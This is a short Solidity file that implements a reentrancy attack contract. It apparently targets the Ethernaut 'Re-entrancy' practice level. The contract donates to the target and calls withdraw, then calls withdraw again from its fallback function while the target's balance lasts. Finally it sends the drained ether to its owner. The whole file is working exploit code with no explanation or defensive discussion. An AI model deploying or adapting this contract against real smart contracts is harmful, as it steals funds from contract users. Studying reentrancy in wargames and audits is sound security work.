// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentrancyAttack {
    
    address public owner;
    IReentrance reentrance;
    uint balance = 1000000000000000;

    constructor(address _reentrance) {
        reentrance = IReentrance(_reentrance);
        owner = msg.sender;
    }

    function reenter() public payable {
        reentrance.donate{value:msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    function withdrawProfits() public {
        require(msg.sender == owner);
        uint totalBalance = address(this).balance;
        msg.sender.call{value:totalBalance}("");
    }

    fallback() external payable {
        if(address(reentrance).balance >= 0.001 ether) {
            reentrance.withdraw(balance);
        }
    }
}